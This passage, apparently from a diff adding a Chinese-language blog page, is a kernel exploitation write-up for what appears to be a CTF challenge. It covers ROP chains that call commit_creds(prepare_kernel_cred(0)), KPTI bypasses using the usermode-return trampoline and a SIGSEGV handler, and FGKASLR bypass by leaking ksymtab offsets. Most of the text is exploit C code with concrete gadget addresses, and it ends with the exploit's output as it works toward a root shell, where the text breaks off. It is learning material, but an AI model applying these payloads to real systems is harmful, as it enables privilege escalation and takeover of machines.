+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span> <span class="c1">// rdi &lt;- 1
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rsi_ret</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span> <span class="c1">// rsi &lt;- 1
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cmp_rdi_rsi_jne_pop_ret</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                      <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rdi_rax_jne_pop2_ret</span><span class="p">;</span> <span class="c1">// rdi &lt;- rax
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                      <span class="c1">// dummy rbx
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                      <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>    <span class="c1">// commit_creds(prepare_kernel_cred(0))
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_pop_ret</span><span class="p">;</span> <span class="c1">// swapgs
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>             <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">iretq</span><span class="p">;</span>           <span class="c1">// iretq frame
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rip</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里<code>0x5b000000 - 0x1000</code>是为了让栈有增长的空间，以顺利的执行其他函数。</p>
+<h2 id="add-kpti">Add KPTI</h2>
+<p>有了<code>KPTI</code>用户空间页表与内核空间页表隔离开。我们从内核态直接使用<code>iretq</code>返回，没有切换页表。所以当用户态的程序想要执行时会造成段错误。这里有两种方法进行bypass：</p>
+<ul>
+<li>执行正常返回应该执行的函数。</li>
+<li>使用信号处理：在Linux中，我们可以注册信号处理函数。在<code>Segmentation fault</code>时，内核会向进程发送一个<code>SIGSEGV</code>信号。一般情况下，这个信号使程序进行异常处理，异常处理的程序在内核代码中，最终结果是杀死这个进程。如果我们注册了处理服务，内核在处理时就会回到用户态！这正达成了我们的目的。</li>
+</ul>
+<h3 id="normal-rop">Normal ROP</h3>
+<p>正常返回时会调用的函数为<code>swapgs_restore_regs_and_return_to_usermode</code>。我们通过<code>/proc/kallsyms</code>得到它的地址。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/ <span class="c1"># cat /proc/kallsyms |grep swapgs_restore_regs_and_return_to_usermode</span>
+ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
+</code></pre></td></tr></table>
+</div>
+</div><p>这个函数在ida中是这样的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">.text:FFFFFFFF81200F10                 pop     r15
+.text:FFFFFFFF81200F12                 pop     r14
+.text:FFFFFFFF81200F14                 pop     r13
+.text:FFFFFFFF81200F16                 pop     r12
+.text:FFFFFFFF81200F18                 pop     rbp
+.text:FFFFFFFF81200F19                 pop     rbx
+.text:FFFFFFFF81200F1A                 pop     r11
+.text:FFFFFFFF81200F1C                 pop     r10
+.text:FFFFFFFF81200F1E                 pop     r9
+.text:FFFFFFFF81200F20                 pop     r8
+.text:FFFFFFFF81200F22                 pop     rax
+.text:FFFFFFFF81200F23                 pop     rcx
+.text:FFFFFFFF81200F24                 pop     rdx
+.text:FFFFFFFF81200F25                 pop     rsi
+.text:FFFFFFFF81200F26                 mov     rdi, rsp
+.text:FFFFFFFF81200F29                 mov     rsp, qword ptr gs:unk_6004
+.text:FFFFFFFF81200F32                 push    qword ptr [rdi+30h]
+.text:FFFFFFFF81200F35                 push    qword ptr [rdi+28h]
+.text:FFFFFFFF81200F38                 push    qword ptr [rdi+20h]
+.text:FFFFFFFF81200F3B                 push    qword ptr [rdi+18h]
+.text:FFFFFFFF81200F3E                 push    qword ptr [rdi+10h]
+.text:FFFFFFFF81200F41                 push    qword ptr [rdi]
+.text:FFFFFFFF81200F43                 push    rax
+.text:FFFFFFFF81200F44                 jmp     short loc_FFFFFFFF81200F89
+...
+</code></pre></td></tr></table>
+</div>
+</div><p>前面多出了很多<code>pop xxx</code>这无疑会加长我们的ROP链，所以我们可以从<code>swapgs_restore_regs_and_return_to_usermode+22</code>开始。</p>
+<p>还有一些值得关注的地方。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">.text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89:
+.text:FFFFFFFF81200F89                               pop     rax
+.text:FFFFFFFF81200F8A                               pop     rdi
+.text:FFFFFFFF81200F8B                               call    cs:off_FFFFFFFF82040088
+.text:FFFFFFFF81200F91                               jmp     cs:off_FFFFFFFF82040080
+...
+.text.native_swapgs:FFFFFFFF8146D4E0                 push    rbp
+.text.native_swapgs:FFFFFFFF8146D4E1                 mov     rbp, rsp
+.text.native_swapgs:FFFFFFFF8146D4E4                 swapgs
+.text.native_swapgs:FFFFFFFF8146D4E7                 pop     rbp
+.text.native_swapgs:FFFFFFFF8146D4E8                 retn
+...
+.text:FFFFFFFF8120102E                               mov     rdi, cr3
+.text:FFFFFFFF81201031                               jmp     short loc_FFFFFFFF81201067
+...
+.text:FFFFFFFF81201067                               or      rdi, 1000h
+.text:FFFFFFFF8120106E                               mov     cr3, rdi
+...
+.text:FFFFFFFF81200FC7                               iretq
+</code></pre></td></tr></table>
+</div>
+</div><p>在<code>jmp     short loc_FFFFFFFF81200F89</code>后，有两个多的<code>pop</code>所以我们要体现布置好填充。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>    <span class="c1">// commit_creds(prepare_kernel_cred(0))
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_pass</span><span class="p">;</span> <span class="c1">// swwapgs_restore_regs_and_return_to_usermode
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>           <span class="c1">// dummy rax
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>           <span class="c1">// dummy rdi
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rip</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="signal-handler">Signal handler</h3>
+<p>保持原来的payload不变，在main中进行处理函数注册<code>signal(SIGSEGV, get_shell);</code></p>
+<p>绝妙的主意！</p>
+<h2 id="add-smap">Add SMAP</h2>
+<p>添加<code>SMAP</code>后用户态的页面无法被访问，这并没有影响我们的ROP。但是栈迁移无法被使用，我们无法将栈劫持到用户空间。</p>
+<p>目前绕过的技术仍然未知。TODO</p>
+<h2 id="add-kaslr">Add KASLR</h2>
+<p>现在，我们面对完整的挑战了！</p>
+<p>如果仅仅使用<code>KASLR</code>我们可以在栈上泄露内核的基址并通过偏移找到其他所有函数。这没有增加太大的困难。在<code>FGKASLR</code>下，即使我们知道了内核的基址，其他函数的偏移依然无法确定。</p>
+<blockquote>
+<p>运行多次并查看<code>/proc/kallsyms</code>，发现每次偏移都不同，则开启的<code>FGASLR</code></p>
+</blockquote>
+<p>在<code>FGKASLR</code>下有一些偏移是不变的：</p>
+<ul>
+<li>从<code>_text</code>到<code>__x86_retpoline_r15</code>，即<code>_text+0x400dc6</code></li>
+<li><code>swwapgs_restore_regs_and_return_to_usermode</code>没有变化</li>
+<li><code>ksymtab</code>地址，该结构记录其他所有函数的地址信息。我们可以从中得到<code>prepare_kernel_cred</code>和<code>commit_creds</code>。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">kernel_symbol</span> <span class="p">{</span>
+	  <span class="kt">int</span> <span class="n">value_offset</span><span class="p">;</span>		<span class="c1">// funcxx_addr = ksymtab_funcxx_addr + value_offset
+</span><span class="c1"></span>	  <span class="kt">int</span> <span class="n">name_offset</span><span class="p">;</span>
+	  <span class="kt">int</span> <span class="n">namespace_offset</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>寻找能使用的gadget。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
+</span><span class="cm">ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
+</span><span class="cm">ffffffff81f8d4fc r __ksymtab_prepare_kernel_cred
+</span><span class="cm">ffffffff81f87d90 r __ksymtab_commit_creds
+</span><span class="cm">
+</span><span class="cm">0xffffffff81015a7f : mov rax, qword ptr [rax] ; pop rbp ; ret
+</span><span class="cm">
+</span><span class="cm">0xffffffff81004d11 : pop rax ; ret
+</span><span class="cm">0xffffffff81006370 : pop rdi ; ret
+</span><span class="cm">0xffffffff81007616 : pop rdx ; ret
+</span><span class="cm">0xffffffff81006158 : pop rbx ; ret
+</span><span class="cm">0xffffffff8100636d : pop r12 ; pop r15 ; ret
+</span><span class="cm">0xffffffff8100636f : pop r15 ; ret
+</span><span class="cm">0xffffffff8100636e : pop rsp ; pop r15 ; ret
+</span><span class="cm">*/</span>
+
+<span class="kt">void</span> <span class="nf">leak</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">40</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+    <span class="n">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
+    <span class="n">canary</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">38</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0xa157ULL</span><span class="p">;</span>
+    <span class="n">kpti_pass</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x200f10ULL</span> <span class="o">+</span> <span class="mi">22ULL</span><span class="p">;</span>
+    <span class="n">pop_rax</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x4d11ULL</span><span class="p">;</span>
+    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x6370ULL</span><span class="p">;</span>
+    <span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x7616ULL</span><span class="p">;</span>
+    <span class="n">pop_rbx</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x6158ULL</span><span class="p">;</span>
+    <span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xf8d4fcULL</span><span class="p">;</span>
+    <span class="n">ksymtab_commit_creds</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xf87d90ULL</span><span class="p">;</span>
+    <span class="n">read_mrax_pop</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x15a7fULL</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">canary</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="leak-prepare_kernel_cred--commit_creds">Leak prepare_kernel_cred() &amp; commit_creds()</h3>
+<p>通过<code>mov rax, qword ptr [rax]</code>可以将<code>value_offset</code>读出，放入到<code>rax</code>中，之后返回用户态，将<code>rax</code>的存入变量中。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// r12
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rax</span><span class="p">;</span>             <span class="c1">// return address
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ksymtab_commit_creds</span><span class="p">;</span>                 
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_mrax_pop</span><span class="p">;</span>   		<span class="c1">// rax &lt;-- [rax]
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">//dummy rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_pass</span><span class="p">;</span> 		<span class="c1">// swapgs_restore_regs_and_return_to_usermode
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>           	<span class="c1">// dummy rax
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>           	<span class="c1">// dummy rdi
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_commit_creds</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">get_prepare_kernel_cred</span><span class="p">()</span>
+<span class="p">{</span>
+        <span class="n">__asm__</span><span class="p">(</span>
+        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+        <span class="s">&#34;mov tmp_store, rax;&#34;</span>
+        <span class="s">&#34;.att_syntax;&#34;</span>
+    <span class="p">);</span>
+    <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">tmp_store</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; prepare_kernel_cred: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">prepare_kernel_cred</span><span class="p">);</span>
+    <span class="n">call_prepare_kernel_cred</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>泄露的payload结构如上，虽然，<code>kpti_pass</code>有会<code>pop rax</code>但是在返回后其值依然会恢复。</p>
+<h3 id="call-prepare_kernel_cred--commit_creds">Call prepare_kernel_cred() &amp; commit_creds()</h3>
+<p>在我们泄露地址后，之后就是常规的ROP。在<code>commit_creds</code>返回<code>creds</code>后，依然要将其保存。因为之前进行<code>rax --&gt; rdi</code>的gadget都不能用了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// r12
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>             <span class="c1">// return address
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                 <span class="c1">// rdi &lt;- 0
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>   <span class="c1">// prepare_kernel_cred(0)
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_pass</span><span class="p">;</span> <span class="c1">// swwapgs_restore_regs_and_return_to_usermode
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>           <span class="c1">// dummy rax
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>           <span class="c1">// dummy rdi
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_creds</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="get-root-shell-">Get root shell !</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/ $ id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span>
+/ $ ./exploit 
+<span class="o">[</span>*<span class="o">]</span> Saved state
+<span class="o">[</span>*<span class="o">]</span> Opened device
+<span class="o">[</span>*<span class="o">]</span> Leaked <span class="m">320</span> bytes
+<span class="o">[</span>*<span class="o">]</span> Cookie: a230d00be9113d00
+<span class="o">[</span>*<span class="o">]</span> Prepared leak_commit_creds pa
